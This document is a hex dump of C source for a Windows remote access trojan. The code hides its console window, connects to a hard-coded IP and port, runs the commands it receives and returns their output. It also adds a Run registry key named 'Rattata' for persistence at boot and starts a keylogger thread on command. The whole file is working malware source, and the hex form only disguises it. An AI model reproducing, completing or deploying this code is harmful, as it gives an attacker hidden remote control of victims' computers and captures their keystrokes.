00000000  23 69 6E 63 6C 75 64 65 20 3C 73 74 64 69 6F 2E  |#include <stdio.|
00000010  68 3E 0A 23 69 6E 63 6C 75 64 65 20 3C 73 74 64  |h>.#include <std|
00000020  6C 69 62 2E 68 3E 0A 23 69 6E 63 6C 75 64 65 20  |lib.h>.#include |
00000030  3C 75 6E 69 73 74 64 2E 68 3E 0A 23 69 6E 63 6C  |<unistd.h>.#incl|
00000040  75 64 65 20 3C 77 69 6E 73 6F 63 6B 32 2E 68 3E  |ude <winsock2.h>|
00000050  0A 23 69 6E 63 6C 75 64 65 20 3C 77 69 6E 64 6F  |.#include <windo|
00000060  77 73 2E 68 3E 0A 23 69 6E 63 6C 75 64 65 20 3C  |ws.h>.#include <|
00000070  77 69 6E 75 73 65 72 2E 68 3E 0A 23 69 6E 63 6C  |winuser.h>.#incl|
00000080  75 64 65 20 3C 77 69 6E 69 6E 65 74 2E 68 3E 0A  |ude <wininet.h>.|
00000090  23 69 6E 63 6C 75 64 65 20 3C 77 69 6E 64 6F 77  |#include <window|
000000A0  73 78 2E 68 3E 0A 23 69 6E 63 6C 75 64 65 20 3C  |sx.h>.#include <|
000000B0  73 74 72 69 6E 67 2E 68 3E 0A 23 69 6E 63 6C 75  |string.h>.#inclu|
000000C0  64 65 20 3C 73 79 73 2F 73 74 61 74 2E 68 3E 0A  |de <sys/stat.h>.|
000000D0  23 69 6E 63 6C 75 64 65 20 3C 73 79 73 2F 74 79  |#include <sys/ty|
000000E0  70 65 73 2E 68 3E 0A 23 69 6E 63 6C 75 64 65 20  |pes.h>.#include |
000000F0  22 6B 65 79 6C 6F 67 67 65 72 2E 68 22 0A 23 64  |"keylogger.h".#d|
00000100  65 66 69 6E 65 20 62 7A 65 72 6F 28 70 2C 20 73  |efine bzero(p, s|
00000110  69 7A 65 29 20 28 76 6F 69 64 29 20 6D 65 6D 73  |ize) (void) mems|
00000120  65 74 28 28 70 29 2C 30 2C 28 73 69 7A 65 29 29  |et((p),0,(size))|
00000130  0A 69 6E 74 20 73 6F 63 6B 3B 0A 69 6E 74 20 62  |.int sock;.int b|
00000140  6F 6F 74 52 75 6E 28 29 7B 0A 09 0A 09 63 68 61  |ootRun(){....cha|
00000150  72 20 65 72 72 5B 31 32 38 5D 20 3D 20 22 46 61  |r err[128] = "Fa|
00000160  69 6C 65 64 5C 6E 22 3B 0A 09 63 68 61 72 20 73  |iled\n";..char s|
00000170  75 63 5B 31 32 38 5D 20 3D 20 22 43 72 65 61 74  |uc[128] = "Creat|
00000180  65 64 20 50 65 72 73 69 73 74 65 6E 63 65 20 41  |ed Persistence A|
00000190  74 20 3A 20 48 4B 45 59 5F 43 55 52 52 45 4E 54  |t : HKEY_CURRENT|
000001A0  5F 55 53 45 52 5C 5C 53 6F 66 74 77 61 72 65 5C  |_USER\\Software\|
000001B0  5C 4D 69 63 72 6F 73 6F 66 74 5C 5C 57 69 6E 64  |\Microsoft\\Wind|
000001C0  6F 77 73 5C 5C 43 75 72 72 65 6E 74 56 65 72 73  |ows\\CurrentVers|
000001D0  69 6F 6E 5C 5C 52 75 6E 5C 6E 22 3B 0A 09 54 43  |ion\\Run\n";..TC|
000001E0  48 41 52 20 73 7A 50 61 74 68 5B 4D 41 58 5F 50  |HAR szPath[MAX_P|
000001F0  41 54 48 5D 3B 0A 09 44 57 4F 52 44 20 70 61 74  |ATH];..DWORD pat|
00000200  68 4C 65 6E 20 3D 20 30 3B 0A 09 70 61 74 68 4C  |hLen = 0;..pathL|
00000210  65 6E 20 3D 20 47 65 74 4D 6F 64 75 6C 65 46 69  |en = GetModuleFi|
00000220  6C 65 4E 61 6D 65 28 4E 55 4C 4C 2C 73 7A 50 61  |leName(NULL,szPa|
00000230  74 68 2C 4D 41 58 5F 50 41 54 48 29 3B 0A 09 69  |th,MAX_PATH);..i|
00000240  66 28 70 61 74 68 4C 65 6E 20 3D 3D 20 30 29 20  |f(pathLen == 0) |
00000250  7B 0A 09 09 73 65 6E 64 28 73 6F 63 6B 2C 20 65  |{...send(sock, e|
00000260  72 72 2C 20 73 69 7A 65 6F 66 28 65 72 72 29 2C  |rr, sizeof(err),|
00000270  30 29 3B 0A 09 09 72 65 74 75 72 6E 20 2D 20 31  |0);...return - 1|
00000280  3B 0A 09 7D 0A 09 0A 09 48 4B 45 59 20 4E 65 77  |;..}....HKEY New|
00000290  56 61 6C 3B 0A 09 0A 09 69 66 20 28 52 65 67 4F  |Val;....if (RegO|
000002A0  70 65 6E 4B 65 79 28 48 4B 45 59 5F 43 55 52 52  |penKey(HKEY_CURR|
000002B0  45 4E 54 5F 55 53 45 52 2C 20 54 45 58 54 28 22  |ENT_USER, TEXT("|
000002C0  53 6F 66 74 77 61 72 65 5C 5C 4D 69 63 72 6F 73  |Software\\Micros|
000002D0  6F 66 74 5C 5C 57 69 6E 64 6F 77 73 5C 5C 43 75  |oft\\Windows\\Cu|
000002E0  72 72 65 6E 74 56 65 72 73 69 6F 6E 5C 5C 52 75  |rrentVersion\\Ru|
000002F0  6E 22 29 2C 20 26 4E 65 77 56 61 6C 29 20 21 3D  |n"), &NewVal) !=|
00000300  20 45 52 52 4F 52 5F 53 55 43 43 45 53 53 29 7B  | ERROR_SUCCESS){|
00000310  0A 09 09 0A 09 09 73 65 6E 64 28 73 6F 63 6B 2C  |......send(sock,|
00000320  20 65 72 72 2C 20 73 69 7A 65 6F 66 28 65 72 72  | err, sizeof(err|
00000330  29 2C 20 30 29 3B 0A 09 09 72 65 74 75 72 6E 20  |), 0);...return |
00000340  2D 31 3B 0A 09 7D 0A 09 0A 09 44 57 4F 52 44 20  |-1;..}....DWORD |
00000350  70 61 74 68 4C 65 6E 49 6E 42 79 74 65 73 20 3D  |pathLenInBytes =|
00000360  20 70 61 74 68 4C 65 6E 20 2A 20 73 69 7A 65 6F  | pathLen * sizeo|
00000370  66 28 2A 73 7A 50 61 74 68 29 3B 0A 09 69 66 20  |f(*szPath);..if |
00000380  28 52 65 67 53 65 74 56 61 6C 75 65 45 78 28 4E  |(RegSetValueEx(N|
00000390  65 77 56 61 6C 2C 54 45 58 54 28 22 52 61 74 74  |ewVal,TEXT("Ratt|
000003A0  61 74 61 22 29 2C 20 30 2C 20 52 45 47 5F 53 5A  |ata"), 0, REG_SZ|
000003B0  2C 28 4C 50 42 59 54 45 29 73 7A 50 61 74 68 2C  |,(LPBYTE)szPath,|
000003C0  20 70 61 74 68 4C 65 6E 49 6E 42 79 74 65 73 29  | pathLenInBytes)|
000003D0  20 21 3D 20 45 52 52 4F 52 5F 53 55 43 43 45 53  | != ERROR_SUCCES|
000003E0  53 29 7B 0A 09 09 0A 09 09 0A 09 09 52 65 67 43  |S){.........RegC|
000003F0  6C 6F 73 65 4B 65 79 28 4E 65 77 56 61 6C 29 3B  |loseKey(NewVal);|
00000400  0A 09 09 73 65 6E 64 28 73 6F 63 6B 2C 65 72 72  |...send(sock,err|
00000410  2C 20 73 69 7A 65 6F 66 28 65 72 72 29 2C 30 29  |, sizeof(err),0)|
00000420  3B 0A 09 09 72 65 74 75 72 6E 20 2D 31 3B 0A 09  |;...return -1;..|
00000430  7D 0A 09 0A 09 0A 09 52 65 67 43 6C 6F 73 65 4B  |}......RegCloseK|
00000440  65 79 28 4E 65 77 56 61 6C 29 3B 0A 09 73 65 6E  |ey(NewVal);..sen|
00000450  64 28 73 6F 63 6B 2C 73 75 63 2C 73 69 7A 65 6F  |d(sock,suc,sizeo|
00000460  66 28 73 75 63 29 2C 30 29 3B 0A 09 72 65 74 75  |f(suc),0);..retu|
00000470  72 6E 20 30 3B 0A 7D 0A 63 68 61 72 20 2A 0A 73  |rn 0;.}.char *.s|
00000480  74 72 5F 63 75 74 28 63 68 61 72 20 73 74 72 5B  |tr_cut(char str[|
00000490  5D 2C 20 69 6E 74 20 73 6C 69 63 65 5F 66 72 6F  |], int slice_fro|
000004A0  6D 2C 20 69 6E 74 20 73 6C 69 63 65 5F 74 6F 29  |m, int slice_to)|
000004B0  0A 7B 0A 20 20 20 20 20 20 20 20 69 66 20 28 73  |.{.        if (s|
000004C0  74 72 5B 30 5D 20 3D 3D 20 27 5C 30 27 29 0A 20  |tr[0] == '\0'). |
000004D0  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 72  |               r|
000004E0  65 74 75 72 6E 20 4E 55 4C 4C 3B 0A 20 20 20 20  |eturn NULL;.    |
000004F0  20 20 20 20 63 68 61 72 20 2A 62 75 66 66 65 72  |    char *buffer|
00000500  3B 0A 20 20 20 20 20 20 20 20 73 69 7A 65 5F 74  |;.        size_t|
00000510  20 73 74 72 5F 6C 65 6E 2C 20 62 75 66 66 65 72  | str_len, buffer|
00000520  5F 6C 65 6E 3B 0A 20 20 20 20 20 20 20 20 69 66  |_len;.        if|
00000530  20 28 73 6C 69 63 65 5F 74 6F 20 3C 20 30 20 26  | (slice_to < 0 &|
00000540  26 20 73 6C 69 63 65 5F 66 72 6F 6D 20 3E 20 73  |& slice_from > s|
00000550  6C 69 63 65 5F 74 6F 29 20 7B 0A 20 20 20 20 20  |lice_to) {.     |
00000560  20 20 20 20 20 20 20 20 20 20 20 73 74 72 5F 6C  |           str_l|
00000570  65 6E 20 3D 20 73 74 72 6C 65 6E 28 73 74 72 29  |en = strlen(str)|
00000580  3B 0A 20 20 20 20 20 20 20 20 20 20 20 20 20 20  |;.              |
00000590  20 20 69 66 20 28 61 62 73 28 73 6C 69 63 65 5F  |  if (abs(slice_|
000005A0  74 6F 29 20 3E 20 73 74 72 5F 6C 65 6E 20 2D 20  |to) > str_len - |
000005B0  31 29 0A 20 20 20 20 20 20 20 20 20 20 20 20 20  |1).             |
000005C0  20 20 20 20 20 20 20 20 20 20 20 72 65 74 75 72  |           retur|
000005D0  6E 20 4E 55 4C 4C 3B 0A 20 20 20 20 20 20 20 20  |n NULL;.        |
000005E0  20 20 20 20 20 20 20 20 69 66 20 28 61 62 73 28  |        if (abs(|
000005F0  73 6C 69 63 65 5F 66 72 6F 6D 29 20 3E 20 73 74  |slice_from) > st|
00000600  72 5F 6C 65 6E 29 0A 20 20 20 20 20 20 20 20 20  |r_len).         |
00000610  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 73  |               s|
00000620  6C 69 63 65 5F 66 72 6F 6D 20 3D 20 28 2D 31 29  |lice_from = (-1)|
00000630  20 2A 20 73 74 72 5F 6C 65 6E 3B 0A 20 20 20 20  | * str_len;.    |
00000640  20 20 20 20 20 20 20 20 20 20 20 20 62 75 66 66  |            buff|
00000650  65 72 5F 6C 65 6E 20 3D 20 73 6C 69 63 65 5F 74  |er_len = slice_t|
00000660  6F 20 2D 20 73 6C 69 63 65 5F 66 72 6F 6D 3B 0A  |o - slice_from;.|
00000670  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20  |                |
00000680  73 74 72 20 2B 3D 20 28 73 74 72 5F 6C 65 6E 20  |str += (str_len |
00000690  2B 20 73 6C 69 63 65 5F 66 72 6F 6D 29 3B 0A 20  |+ slice_from);. |
000006A0  20 20 20 20 20 20 20 7D 20 65 6C 73 65 20 69 66  |       } else if|
000006B0  20 28 73 6C 69 63 65 5F 66 72 6F 6D 20 3E 3D 20  | (slice_from >= |
000006C0  30 20 26 26 20 73 6C 69 63 65 5F 74 6F 20 3E 20  |0 && slice_to > |
000006D0  73 6C 69 63 65 5F 66 72 6F 6D 29 20 7B 0A 20 20  |slice_from) {.  |
000006E0  20 20 20 20 20 20 20 20 20 20 20 20 20 20 73 74  |              st|
000006F0  72 5F 6C 65 6E 20 3D 20 73 74 72 6C 65 6E 28 73  |r_len = strlen(s|
00000700  74 72 29 3B 0A 20 20 20 20 20 20 20 20 20 20 20  |tr);.           |
00000710  20 20 20 20 20 69 66 20 28 73 6C 69 63 65 5F 66  |     if (slice_f|
00000720  72 6F 6D 20 3E 20 73 74 72 5F 6C 65 6E 20 2D 20  |rom > str_len - |
00000730  31 29 0A 20 20 20 20 20 20 20 20 20 20 20 20 20  |1).             |
00000740  20 20 20 20 20 20 20 20 20 20 20 72 65 74 75 72  |           retur|
00000750  6E 20 4E 55 4C 4C 3B 0A 20 20 20 20 20 20 20 20  |n NULL;.        |
00000760  20 20 20 20 20 20 20 20 62 75 66 66 65 72 5F 6C  |        buffer_l|
00000770  65 6E 20 3D 20 73 6C 69 63 65 5F 74 6F 20 2D 20  |en = slice_to - |
00000780  73 6C 69 63 65 5F 66 72 6F 6D 3B 0A 20 20 20 20  |slice_from;.    |
00000790  20 20 20 20 20 20 20 20 20 20 20 20 73 74 72 20  |            str |
000007A0  2B 3D 20 73 6C 69 63 65 5F 66 72 6F 6D 3B 0A 20  |+= slice_from;. |
000007B0  20 20 20 20 20 20 20 7D 20 65 6C 73 65 0A 20 20  |       } else.  |
000007C0  20 20 20 20 20 20 20 20 20 20 20 20 20 20 72 65  |              re|
000007D0  74 75 72 6E 20 4E 55 4C 4C 3B 0A 20 20 20 20 20  |turn NULL;.     |
000007E0  20 20 20 62 75 66 66 65 72 20 3D 20 63 61 6C 6C  |   buffer = call|
000007F0  6F 63 28 62 75 66 66 65 72 5F 6C 65 6E 2C 20 73  |oc(buffer_len, s|
00000800  69 7A 65 6F 66 28 63 68 61 72 29 29 3B 0A 20 20  |izeof(char));.  |
00000810  20 20 20 20 20 20 73 74 72 6E 63 70 79 28 62 75  |      strncpy(bu|
00000820  66 66 65 72 2C 20 73 74 72 2C 20 62 75 66 66 65  |ffer, str, buffe|
00000830  72 5F 6C 65 6E 29 3B 0A 20 20 20 20 20 20 20 20  |r_len);.        |
00000840  72 65 74 75 72 6E 20 62 75 66 66 65 72 3B 0A 7D  |return buffer;.}|
00000850  0A 76 6F 69 64 20 53 68 65 6C 6C 28 29 7B 0A 09  |.void Shell(){..|
00000860  0A 09 63 68 61 72 20 62 75 66 66 65 72 5B 31 30  |..char buffer[10|
00000870  32 34 5D 3B 0A 09 63 68 61 72 20 63 6F 6E 74 61  |24];..char conta|
00000880  69 6E 65 72 5B 31 30 32 34 5D 3B 0A 09 63 68 61  |iner[1024];..cha|
00000890  72 20 74 6F 74 61 6C 5F 72 65 73 70 6F 6E 73 65  |r total_response|
000008A0  5B 31 38 33 38 34 5D 3B 0A 09 77 68 69 6C 65 20  |[18384];..while |
000008B0  28 31 29 7B 0A 09 09 6A 75 6D 70 3A 0A 09 09 0A  |(1){...jump:....|
000008C0  09 09 62 7A 65 72 6F 28 62 75 66 66 65 72 2C 31  |..bzero(buffer,1|
000008D0  30 32 34 29 3B 0A 09 09 62 7A 65 72 6F 28 63 6F  |024);...bzero(co|
000008E0  6E 74 61 69 6E 65 72 2C 73 69 7A 65 6F 66 28 63  |ntainer,sizeof(c|
000008F0  6F 6E 74 61 69 6E 65 72 29 29 3B 0A 09 09 62 7A  |ontainer));...bz|
00000900  65 72 6F 28 74 6F 74 61 6C 5F 72 65 73 70 6F 6E  |ero(total_respon|
00000910  73 65 2C 73 69 7A 65 6F 66 28 74 6F 74 61 6C 5F  |se,sizeof(total_|
00000920  72 65 73 70 6F 6E 73 65 29 29 3B 0A 09 09 0A 09  |response));.....|
00000930  09 0A 09 09 72 65 63 76 28 73 6F 63 6B 2C 62 75  |....recv(sock,bu|
00000940  66 66 65 72 2C 20 31 30 32 34 2C 20 30 29 3B 0A  |ffer, 1024, 0);.|
00000950  09 09 0A 09 09 0A 09 09 69 66 20 28 73 74 72 6E  |........if (strn|
00000960  63 6D 70 28 22 71 22 2C 20 62 75 66 66 65 72 2C  |cmp("q", buffer,|
00000970  31 29 3D 3D 30 29 7B 0A 09 09 09 0A 09 09 09 63  |1)==0){........c|
00000980  6C 6F 73 65 73 6F 63 6B 65 74 28 73 6F 63 6B 29  |losesocket(sock)|
00000990  3B 0A 09 09 09 57 53 41 43 6C 65 61 6E 75 70 28  |;....WSACleanup(|
000009A0  29 3B 0A 09 09 09 65 78 69 74 28 30 29 3B 0A 09  |);....exit(0);..|
000009B0  09 7D 0A 09 09 65 6C 73 65 20 69 66 28 73 74 72  |.}...else if(str|
000009C0  6E 63 6D 70 28 22 63 64 20 22 2C 20 62 75 66 66  |ncmp("cd ", buff|
000009D0  65 72 2C 20 33 29 3D 3D 30 29 7B 0A 09 09 09 0A  |er, 3)==0){.....|
000009E0  09 09 09 63 68 64 69 72 28 73 74 72 5F 63 75 74  |...chdir(str_cut|
000009F0  28 62 75 66 66 65 72 2C 33 2C 31 30 30 29 29 3B  |(buffer,3,100));|
00000A00  0A 09 09 7D 0A 09 09 65 6C 73 65 20 69 66 28 73  |...}...else if(s|
00000A10  74 72 6E 63 6D 70 28 22 70 65 72 73 69 73 74 22  |trncmp("persist"|
00000A20  2C 20 62 75 66 66 65 72 2C 20 37 29 20 3D 3D 30  |, buffer, 7) ==0|
00000A30  29 7B 0A 09 09 09 62 6F 6F 74 52 75 6E 28 29 3B  |){....bootRun();|
00000A40  0A 09 09 7D 0A 09 09 65 6C 73 65 20 69 66 20 28  |...}...else if (|
00000A50  73 74 72 6E 63 6D 70 28 22 6B 65 79 6C 6F 67 5F  |strncmp("keylog_|
00000A60  73 74 61 72 74 22 2C 20 62 75 66 66 65 72 2C 20  |start", buffer, |
00000A70  31 32 29 20 3D 3D 20 30 29 7B 0A 09 09 09 48 41  |12) == 0){....HA|
00000A80  4E 44 4C 45 20 74 68 72 65 61 64 20 3D 20 43 72  |NDLE thread = Cr|
00000A90  65 61 74 65 54 68 72 65 61 64 28 4E 55 4C 4C 2C  |eateThread(NULL,|
00000AA0  30 2C 20 6C 6F 67 67 2C 20 4E 55 4C 4C 2C 20 30  |0, logg, NULL, 0|
00000AB0  2C 20 4E 55 4C 4C 29 3B 0A 09 09 09 67 6F 74 6F  |, NULL);....goto|
00000AC0  20 6A 75 6D 70 3B 0A 09 09 7D 0A 09 09 65 6C 73  | jump;...}...els|
00000AD0  65 7B 0A 09 09 09 0A 09 09 09 0A 09 09 09 0A 09  |e{..............|
00000AE0  09 09 46 49 4C 45 20 2A 66 70 3B 0A 09 09 09 0A  |..FILE *fp;.....|
00000AF0  09 09 09 0A 09 09 09 66 70 20 3D 20 70 6F 70 65  |.......fp = pope|
00000B00  6E 28 62 75 66 66 65 72 2C 22 72 22 29 3B 0A 09  |n(buffer,"r");..|
00000B10  09 09 0A 09 09 09 0A 09 09 09 0A 09 09 09 77 68  |..............wh|
00000B20  69 6C 65 28 66 67 65 74 73 28 63 6F 6E 74 61 69  |ile(fgets(contai|
00000B30  6E 65 72 2C 31 30 32 34 2C 66 70 29 20 21 3D 20  |ner,1024,fp) != |
00000B40  4E 55 4C 4C 29 20 7B 0A 09 09 09 09 73 74 72 63  |NULL) {.....strc|
00000B50  61 74 28 74 6F 74 61 6C 5F 72 65 73 70 6F 6E 73  |at(total_respons|
00000B60  65 2C 20 63 6F 6E 74 61 69 6E 65 72 29 3B 0A 09  |e, container);..|
00000B70  09 09 7D 0A 09 09 09 0A 09 09 09 73 65 6E 64 28  |..}........send(|
00000B80  73 6F 63 6B 2C 74 6F 74 61 6C 5F 72 65 73 70 6F  |sock,total_respo|
00000B90  6E 73 65 2C 73 69 7A 65 6F 66 28 74 6F 74 61 6C  |nse,sizeof(total|
00000BA0  5F 72 65 73 70 6F 6E 73 65 29 2C 30 29 3B 0A 09  |_response),0);..|
00000BB0  09 09 0A 09 09 09 66 63 6C 6F 73 65 28 66 70 29  |......fclose(fp)|
00000BC0  3B 0A 09 09 7D 0A 09 7D 0A 7D 0A 69 6E 74 20 41  |;...}..}.}.int A|
00000BD0  50 49 45 4E 54 52 59 20 57 69 6E 4D 61 69 6E 28  |PIENTRY WinMain(|
00000BE0  48 49 4E 53 54 41 4E 43 45 20 68 49 6E 73 74 61  |HINSTANCE hInsta|
00000BF0  6E 63 65 2C 20 48 49 4E 53 54 41 4E 43 45 20 68  |nce, HINSTANCE h|
00000C00  50 72 65 76 2C 4C 50 53 54 52 20 6C 70 43 6D 64  |Prev,LPSTR lpCmd|
00000C10  4C 69 6E 65 2C 69 6E 74 20 6E 43 6D 64 53 68 6F  |Line,int nCmdSho|
00000C20  77 29 7B 0A 09 0A 09 48 57 4E 44 20 73 74 65 61  |w){....HWND stea|
00000C30  6C 74 68 3B 0A 09 41 6C 6C 6F 63 43 6F 6E 73 6F  |lth;..AllocConso|
00000C40  6C 65 28 29 3B 0A 09 73 74 65 61 6C 74 68 20 3D  |le();..stealth =|
00000C50  20 20 46 69 6E 64 57 69 6E 64 6F 77 41 28 22 43  |  FindWindowA("C|
00000C60  6F 6E 73 6F 6C 65 57 69 6E 64 6F 77 43 6C 61 73  |onsoleWindowClas|
00000C70  73 22 2C 20 4E 55 4C 4C 29 3B 0A 09 0A 09 53 68  |s", NULL);....Sh|
00000C80  6F 77 57 69 6E 64 6F 77 28 73 74 65 61 6C 74 68  |owWindow(stealth|
00000C90  2C 20 30 29 3B 0A 09 0A 09 73 74 72 75 63 74 20  |, 0);....struct |
00000CA0  73 6F 63 6B 61 64 64 72 5F 69 6E 20 53 65 72 76  |sockaddr_in Serv|
00000CB0  41 64 64 72 3B 0A 09 75 6E 73 69 67 6E 65 64 20  |Addr;..unsigned |
00000CC0  73 68 6F 72 74 20 53 65 72 76 50 6F 72 74 3B 0A  |short ServPort;.|
00000CD0  09 63 68 61 72 20 2A 53 65 72 76 49 50 3B 0A 09  |.char *ServIP;..|
00000CE0  57 53 41 44 41 54 41 20 77 73 61 44 61 74 61 3B  |WSADATA wsaData;|
00000CF0  0A 09 0A 09 53 65 72 76 49 50 20 20 20 3D 20 22  |....ServIP   = "|
00000D00  31 39 32 2E 31 36 38 2E 30 2E 31 30 35 22 3B 0A  |192.168.0.105";.|
00000D10  09 53 65 72 76 50 6F 72 74 20 3D 20 35 30 30 35  |.ServPort = 5005|
00000D20  3B 20 0A 09 69 66 20 28 57 53 41 53 74 61 72 74  |; ..if (WSAStart|
00000D30  75 70 28 4D 41 4B 45 57 4F 52 44 28 32 2C 30 29  |up(MAKEWORD(2,0)|
00000D40  2C 20 26 77 73 61 44 61 74 61 29 20 21 3D 20 30  |, &wsaData) != 0|
00000D50  29 7B 0A 09 09 65 78 69 74 28 31 29 3B 0A 09 7D  |){...exit(1);..}|
00000D60  0A 09 73 6F 63 6B 20 3D 20 73 6F 63 6B 65 74 28  |..sock = socket(|
00000D70  41 46 5F 49 4E 45 54 2C 20 53 4F 43 4B 5F 53 54  |AF_INET, SOCK_ST|
00000D80  52 45 41 4D 2C 20 30 29 3B 0A 09 6D 65 6D 73 65  |REAM, 0);..memse|
00000D90  74 28 26 53 65 72 76 41 64 64 72 2C 20 30 2C 20  |t(&ServAddr, 0, |
00000DA0  73 69 7A 65 6F 66 28 53 65 72 76 41 64 64 72 29  |sizeof(ServAddr)|
00000DB0  29 3B 09 0A 09 53 65 72 76 41 64 64 72 2E 73 69  |);...ServAddr.si|
00000DC0  6E 5F 66 61 6D 69 6C 79 20 3D 20 41 46 5F 49 4E  |n_family = AF_IN|
00000DD0  45 54 3B 0A 09 53 65 72 76 41 64 64 72 2E 73 69  |ET;..ServAddr.si|
00000DE0  6E 5F 61 64 64 72 2E 73 5F 61 64 64 72 20 3D 20  |n_addr.s_addr = |
00000DF0  69 6E 65 74 5F 61 64 64 72 28 53 65 72 76 49 50  |inet_addr(ServIP|
00000E00  29 3B 0A 09 53 65 72 76 41 64 64 72 2E 73 69 6E  |);..ServAddr.sin|
00000E10  5F 70 6F 72 74 20 3D 20 68 74 6F 6E 73 28 53 65  |_port = htons(Se|
00000E20  72 76 50 6F 72 74 29 3B 0A 09 0A 09 0A 09 77 68  |rvPort);......wh|
00000E30  69 6C 65 20 28 63 6F 6E 6E 65 63 74 28 73 6F 63  |ile (connect(soc|
00000E40  6B 2C 20 28 73 74 72 75 63 74 20 73 6F 63 6B 61  |k, (struct socka|
00000E50  64 64 72 20 2A 29 20 26 53 65 72 76 41 64 64 72  |ddr *) &ServAddr|
00000E60  2C 20 73 69 7A 65 6F 66 28 53 65 72 76 41 64 64  |, sizeof(ServAdd|
00000E70  72 29 29 20 21 3D 20 30 29 7B 0A 09 09 53 6C 65  |r)) != 0){...Sle|
00000E80  65 70 28 31 30 29 3B 0A 09 09 0A 09 7D 0A 09 0A  |ep(10);.....}...|
00000E90  09 0A 09 53 68 65 6C 6C 28 29 3B 0A 7D           |...Shell();.}|